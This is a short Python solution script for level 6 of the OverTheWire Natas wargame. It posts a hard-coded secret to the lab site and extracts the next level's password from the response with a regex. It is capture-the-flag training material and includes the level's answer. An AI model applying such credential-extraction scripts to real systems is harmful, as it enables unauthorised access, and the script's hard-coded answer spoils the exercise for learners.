import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #"secret" value to beat level
    secret = 'FOEIUWGHFEEUHOFUOIU'
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '6'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas6', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #Need to pass "secret value" (FOEIUWGHFEEUHOFUOIU) to the submit "secret" submit field to beat level
    payload = {'secret':secret, 'submit':'Submit'}
    r = requests.post('http://natas6.natas.labs.overthewire.org/', auth=('natas6', passw.strip()), data=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
